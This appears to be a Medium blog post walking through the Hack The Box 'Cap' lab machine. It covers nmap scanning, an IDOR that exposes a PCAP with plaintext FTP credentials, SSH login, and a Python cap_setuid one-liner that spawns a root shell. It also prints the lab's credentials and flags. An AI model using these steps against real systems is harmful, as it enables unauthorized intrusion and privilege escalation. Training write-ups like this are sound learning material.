# :game_die: Medium

---

# Cap-HTB-Walkthrough-By-Reju-Kole

***CAP***

*Welcome! It is time to look at the Cap machine on HackTheBox. I am making these walkthroughs to keep myself motivated to learn cyber security and ensure that I remember the knowledge gained by playing HTB machines.*

*Join me on learning cyber security. I will try and explain concepts as I go, to differentiate myself from other walkthroughs.*

**Level — EasyMachine URL : **[Hack The Box :: Hack The Box](https://app.hackthebox.com/machines/Cap)

**About Cap — ***Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user’s capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root.*

## Enumeration

*To kick off this box, let’s run a Nmap scan to see what services and ports are open.*

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -A 10.10.10.245
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-26 07:31 EDT
Nmap scan report for 10.10.10.245
Host is up (0.58s latency).
Not shown: 997 closed tcp ports (reset)
PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 3.0.3
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
| 256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_ 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open http gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
| fingerprint-strings:
| FourOhFourRequest:
| HTTP/1.0 404 NOT FOUND
| Server: gunicorn
| Date: Thu, 26 Sep 2024 11:31:43 GMT
| Connection: close
| Content-Type: text/html; charset=utf-8
| Content-Length: 232
| <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
| <title>404 Not Found</title>
| <h1>Not Found</h1>
| <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
| GetRequest:
| HTTP/1.0 200 OK
| Server: gunicorn
| Date: Thu, 26 Sep 2024 11:31:33 GMT
| Connection: close
| Content-Type: text/html; charset=utf-8
| Content-Length: 19386
| <!DOCTYPE html>
| <html class="no-js" lang="en">
| <head>
| <meta charset="utf-8">
| <meta http-equiv="x-ua-compatible" content="ie=edge">
| <title>Security Dashboard</title>
| <meta name="viewport" content="width=device-width, initial-scale=1">
| <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
| <link rel="stylesheet" href="/static/css/bootstrap.min.css">
| <link rel="stylesheet" href="/static/css/font-awesome.min.css">
| <link rel="stylesheet" href="/static/css/themify-icons.css">
| <link rel="stylesheet" href="/static/css/metisMenu.css">
| <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
| <link rel="stylesheet" href="/static/css/slicknav.min.css">
| <!-- amchar
| HTTPOptions:
| HTTP/1.0 200 OK
| Server: gunicorn
| Date: Thu, 26 Sep 2024 11:31:35 GMT
| Connection: close
| Content-Type: text/html; charset=utf-8
| Allow: GET, HEAD, OPTIONS
| Content-Length: 0
| RTSPRequest:
| HTTP/1.1 400 Bad Request
| Connection: close
| Content-Type: text/html
| Content-Length: 196
| <html>
| <head>
| <title>Bad Request</title>
| </head>
| <body>
| <h1><p>Bad Request</p></h1>
| Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
| </body>
|_ </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94SVN%I=7%D=9/26%Time=66F54614%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,2A0C,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\
SF:x20Thu,\x2026\x20Sep\x202024\x2011:31:33\x20GMT\r\nConnection:\x20close
SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
SF:19386\r\n\r\n<!DOCTYPE\x20html>\n<html\x20class=\"no-js\"\x20lang=\"en\
SF:">\n\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20
SF:\x20<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x
SF:20\x20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20<me
SF:ta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sca
SF:le=1\">\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20type=\"im
SF:age/png\"\x20href=\"/static/images/icon/favicon\.ico\">\n\x20\x20\x20\x
SF:20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.css
SF:\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/
SF:font-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\
SF:x20href=\"/static/css/themify-icons\.css\">\n\x20\x20\x20\x20<link\x20r
SF:el=\"stylesheet\"\x20href=\"/static/css/metisMenu\.css\">\n\x20\x20\x20
SF:\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.mi
SF:n\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/stati
SF:c/css/slicknav\.min\.css\">\n\x20\x20\x20\x20<!--\x20amchar")%r(HTTPOpt
SF:ions,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Thu,
SF:\x2026\x20Sep\x202024\x2011:31:35\x20GMT\r\nConnection:\x20close\r\nCon
SF:tent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20HEAD,\x2
SF:0OPTIONS\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20t
SF:ext/html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20\
SF:x20\x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<bod
SF:y>\n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Inv
SF:alid\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;R
SF:TSP/1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFourRequest,
SF:189,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x
SF:20Thu,\x2026\x20Sep\x202024\x2011:31:43\x20GMT\r\nConnection:\x20close\
SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x202
SF:32\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\
SF:x20Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</
SF:h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20
SF:server\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x2
SF:0check\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=9/26%OT=21%CT=1%CU=31508%PV=Y%DS=2%DC=T%G=Y%TM=66F5
OS:46D7%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)
OS:SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=B)SEQ(SP=106%GCD=1%ISR=10C%TI
OS:=Z%CI=Z%II=I%TS=C)SEQ(SP=106%GCD=2%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M5
OS:3AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O
OS:6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%D
OS:F=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0
OS:%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=
OS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%
OS:RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%I
OS:PL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT ADDRESS
1 854.30 ms 10.10.16.1
2 425.55 ms 10.10.10.245

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 207.73 seconds
```

*The scan shows that the ports for TCP (21,22,80) total 3 ports are open.*

*21 (FTP) & 22 (SSH) 80 (HTTP)*

>

***Let’s add Cap host to our /etc/hosts file.***

```
echo "10.10.10.245 cap.htb" | sudo tee -a /etc/hosts
```

## Web Enumeration

### Website — TCP 80

*This webpage acts as a comprehensive security monitoring interface.*

***Dashboard**Nathan is logged into the site, however, the links in the dropdown menu below his name are disabled.*

*In addition to the dashboard, the expanded left menu offers three more pages.*

## Get Reju Kole’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

*After a 5-second delay, the Security Snapshot (/capture) redirects to /data/5 and returns a packet list.*

*If I go back to /capture while Feroxbuster is running, it leads me to /data/7, and I can now view actual packets.*

*The link for the download button takes you to /download/7, where it will download a legitimate PCAP file.*

*Upon retrieving the appropriate PCAP file and inspecting it in Wireshark, we discover the FTP credentials.*

```
Username: nathan
Password: Buck3tH4TF0RM3!
```

*After logging into FTP with the credentials above, it becomes clear that the server hosts the SSH directory.*

```
┌──(kali㉿kali)-[~]
└─$ sudo ftp 10.10.10.245
[sudo] password for kali:
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:kali): nathan
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||23160|)
150 Here comes the directory listing.
-rwxrwxrwx 1 1001 1001 824942 Sep 26 09:00 exploit
-rwxrwxr-x 1 1001 1001 52 Sep 26 06:09 py.py
drwxr-xr-x 3 1001 1001 4096 Sep 26 09:02 snap
-r-------- 1 1001 1001 33 Sep 26 04:03 user.txt
226 Directory send OK.
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||54324|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
100% |***| 33 0.18 KiB/s 00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.03 KiB/s)
ftp>
```

### User.txt

```
┌──(kali㉿kali)-[~]
└─$ cat user.txt
33e736ca455ed714f8a1319bb0d10f47
```

*Logging into SSH with the identical FTP credentials proves to be effective.*

```
┌──(kali㉿kali)-[~]
└─$ ssh nathan@10.10.10.245
nathan@10.10.10.245's password:
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

* Documentation: https://help.ubuntu.com
* Management: https://landscape.canonical.com
* Support: https://ubuntu.com/advantage

System information as of Thu Sep 26 12:34:45 UTC 2024

System load: 0.0
Usage of /: 36.8% of 8.73GB
Memory usage: 35%
Swap usage: 0%
Processes: 233
Users logged in: 1
IPv4 address for eth0: 10.10.10.245
IPv6 address for eth0: dead:beef::250:56ff:fe94:ae2d

=> There are 4 zombie processes.

63 updates can be applied immediately.
42 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Sep 26 11:03:16 2024 from 10.10.16.84
nathan@cap:~$ ls
exploit py.py snap user.txt
```

## Privilege Escalation

*Now, regarding privilege escalation, LINPEAS indicates a noteworthy finding concerning cap_setuid in the Python 3.8 binary, which relates to the machine’s name.*

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

***The line ***`***/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip***`*** indicates specific capabilities that are assigned to the Python 3.8 binary located at ***`***/usr/bin/python3.8***`***. Here’s a breakdown of what each part means:***

- `**/usr/bin/python3.8**`: *This is the file path to the Python 3.8 executable on the system.*

- `**cap_setuid**`: *This capability allows a process to change its user ID (UID). In other words, a program with this capability can switch to a different user, which is often necessary for running tasks that require higher privileges.*

- `**cap_net_bind_service**`:* This capability allows a program to bind to network ports below 1024. By default, only the root user can bind to these privileged ports. This is essential for applications that need to listen on standard ports (like HTTP on port 80 or HTTPS on port 443).*

- `**+eip**`: *This indicates that the binary is marked as executable and inheritable. The *`*eip*`* flag means that the binary can inherit the capabilities when executed by other processes. This is significant for security, as it means that processes spawned from this Python executable can inherit the same capabilities, potentially allowing them to perform privileged actions.*

```
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```
nathan@cap:~$ python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@cap:~# cat /root/root.txt
27b95eb8a8a9f365c819004b9e7d93fc
root@cap:~#
```

*Congratulations, you’re now operating as root!*

*I hope you enjoyed this writeup! Happy Hacking :)*

>

**Subscribe to me on Medium and be sure to turn on email notifications so you never miss out on my latest walkthroughs, write-ups, and other informative posts.**

## Follow me on below Social Media:

- ***LinkedIn: *[Reju Kole](http://www.linkedin.com/in/reju-kole)

***2. Instagram: *[reju.kole.9](https://www.instagram.com/reju.kole.9?igsh=MW1iZ2w0dXA4bjBxNg%3D)

***3. Respect me On HackTheBox! : *[Hack The Box :: User Profile](https://app.hackthebox.com/users/1671324)

***4. Check My TryHackMe Profile : *[TryHackMe | W40X](https://tryhackme.com/p/W40X)

***5. Twitter | X : *[@Mr_W40X](https://x.com/Mr_W40X)

***6. GitHub : *[W40X | Reju Kole | Security Researcher](https://github.com/W40X)

>

**incase you need any help feel free to message me on my social media handles.**

---
